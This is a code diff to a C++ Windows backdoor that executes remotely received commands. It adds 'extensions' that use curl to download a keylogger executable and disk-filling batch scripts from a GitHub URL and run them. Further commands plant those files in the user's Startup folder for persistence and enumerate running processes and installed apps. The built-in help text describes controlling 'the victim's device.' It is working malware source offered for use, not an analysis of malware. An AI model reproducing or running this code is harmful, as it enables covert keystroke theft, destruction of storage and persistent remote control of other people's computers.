@@ -19,6 +19,15 @@ using namespace std;
 
 int sock;
 
+
+string Additions(char *buffer);
+// Extensions Function:
+string CE_InfoExt(string buffer);
+string CE_RunExt(string buffer);
+string CE_StartupExt(string buffer);
+string CE_StopExt(string buffer);
+
+
 int strincludes(char *strVar, char *buffer);
 char *strsub(char str[], int slice_from, int slice_to);
 
@@ -124,6 +133,8 @@ start:
         else
         {
 
+            strcpy(buffer, Additions(buffer).c_str());
+
             FILE *fp;
             fp = _popen(buffer, "rt");
             while (fgets(container, 4096, fp))
@@ -168,6 +179,160 @@ start:
 
 //     return;
 // }
+
+
+string Additions(char *buffer)
+{
+
+    string obuf = buffer;
+
+    if (obuf.find("apps_list ") != string::npos)
+    {
+        if (obuf.find("info") != string::npos)
+        {
+            obuf = "echo [APPLIST] [INFO] - This command allows you to view all the applications installed on the victim's device as well as those that are currently running";
+        }
+        else if (obuf.find("run") != string::npos)
+        {
+            if (obuf.find("all") != string::npos)
+            {
+                obuf = "powershell -Command \"Get-Process | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
+            }
+            else
+            {
+                obuf = "powershell -Command \"Get-Process | Where-Object { $_.MainWindowTitle } | Format-Table Handles,NPM,PM,WS,CPU,Id,SI,ProcessName,Name,Mainwindowtitle -AutoSize\"";
+            }
+        }
+        else if (obuf.find("all") != string::npos)
+        {
+            obuf = "powershell -Command \"Get-AppxPackage\"";
+        }
+    }
+    else if (obuf.find("ext ") != string::npos)
+    {
+        if (obuf.find("info") != string::npos)
+        {
+            obuf = CE_InfoExt(obuf);
+        }
+        else if (obuf.find("run") != string::npos)
+        {
+            obuf = CE_RunExt(obuf);
+        }
+        else if (obuf.find("startup") != string::npos)
+        {
+            obuf = CE_StartupExt(obuf);
+        }
+        else if (obuf.find("stop") != string::npos)
+        {
+            obuf = CE_StopExt(obuf);
+        }
+    }
+    return obuf;
+}
+
+/*
+######################################
+            Extensions
+######################################
+*/
+string CE_InfoExt(string buffer)
+{
+    string ebuf = buffer;
+    if (ebuf.find("keylog") != string::npos)
+    {
+        ebuf = "echo [EXT] [INFO] - This extension is built in C++ language and it logs all mouse and keyboard events and makes them available in C:\\ProgramData\\Ms\\log.txt file. And the keylogger.exe file is in C:\\ProgramData\\Ms \nAll events will be added to the file cumulatively, you can delete it if you want to re-registration, or you can use the following command: $ ext reset keylog \n";
+        ebuf += "[ $ ] - Available Commands : \n";
+        ebuf += "[ $ ext run keylog ] ->  for start recording \n";
+        ebuf += "[ $ ext info keylog ] -> show some info for keylog component\n";
+        ebuf += "[ $ ext reset keylog ] -> delete keylog file :  C:\\ProgramData\\Ms\\log.txt \n";
+    }
+    else if (ebuf.find("fill_storage") != string::npos)
+    {
+        ebuf = "echo [EXT] [INFO] - This extension is built in betch, This add-on fills the device with large files and is created very quickly so that the storage capacity of the device can be filled in three seconds, and you can also make it more dangerous by copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup . So that it works automatically when you startup the device \n";
+        ebuf += "[ $ ] - Available Commands : \n";
+        ebuf += "[ $ ext run fill_storage ] ->  for start fill storage \n";
+        ebuf += "[ $ ext startup fill_storage ] -> copying the file fill_storage_move.bat to C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n";
+        ebuf += "[ $ ext info fill_storage ] -> show some info for fill_storage component\n";
+    }
+    else
+    {
+        ebuf = "echo [EXT] [INFO] - The extensions are based on multiple languages and different functions that achieve what the hacker wants to control the victim's device in a simple and fast way \nAvailable extensions :\n--> keylog\n--> fill_storage\n--> network";
+    }
+
+    return ebuf;
+}
+
+string CE_RunExt(string buffer)
+{
+    string ebuf = buffer;
+
+    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";
+
+    if (ebuf.find("keylog") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o C:\\ProgramData\\Ms\\keylogger.exe && IF EXIST C:\\ProgramData\\Ms\\keylogger.exe ( start C:\\ProgramData\\Ms\\keylogger.exe ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component ..";
+        ebuf = command;
+    }
+    else if (ebuf.find("fill_storage") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o C:\\ProgramData\\Ms\\fill_storage_move.bat && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o C:\\ProgramData\\Ms\\fill_storage_virus.bat && IF EXIST C:\\ProgramData\\Ms\\fill_storage_move.bat ( start C:\\ProgramData\\Ms\\fill_storage_move.bat ) ELSE ( echo; ) && echo. && echo [EXT] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component && echo. && echo [EXT] [RUN] - fill_storage component ..";
+        ebuf = command;
+    }
+    else
+    {
+        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
+    }
+
+    return ebuf;
+}
+
+
+string CE_StartupExt(string buffer)
+{
+    string ebuf = buffer;
+
+    string command = "IF NOT EXIST C:\\ProgramData ( mkdir C:\\ProgramData ) ELSE ( echo; ) && IF NOT EXIST C:\\ProgramData\\Ms ( mkdir C:\\ProgramData\\Ms ) ELSE ( echo; ) && ";
+
+    if (ebuf.find("keylog") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/keylogger.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\"";
+        if (ebuf.find("run") != string::npos) {
+            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe\" ) ELSE ( echo; ) ";
+        }
+        command += " && echo. && echo [EXT] [DOWNLOAD] - keylogger.exe component && echo. && echo [EXT] [RUN] - keylog component .. ";
+        ebuf = command;
+    }
+    else if (ebuf.find("fill_storage") != string::npos)
+    {
+        command += "curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/fill_storage_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_virus.bat\" && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) && echo. && echo [CMP] [DOWNLOAD] - fill_storage [ move.bat, virus.bat ] component  && echo [CMP] [RUN] - fill_storage component ..";
+                if (ebuf.find("run") != string::npos) {
+            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fill_storage_move.bat\" ) ELSE ( echo; ) ";
+        }
+        ebuf = command;
+    }
+    else
+    {
+        ebuf = "echo [EXT] [ERR] - You must use a valid component name !";
+    }
+
+    return ebuf;
+}
+
+string CE_StopExt(string buffer)
+{
+    string ebuf = buffer;
+    if (ebuf.find("keylog") != string::npos)
+    {
+        ebuf = "powershell -Command \"Stop-Process -Name \"keylogger\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\keylogger.exe\"} | Stop-Process -WhatIf\"";
+    }
+        if (ebuf.find("fill_storage") != string::npos)
+    {
+        ebuf = "powershell -Command \"Stop-Process -Name \"fill_storage_virus\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\fill_storage_virus.bat\"} | Stop-Process -WhatIf\"";
+    }
+
+
+    return ebuf;
+}
 
 int strincludes(char *strVar, char *buffer)
 {
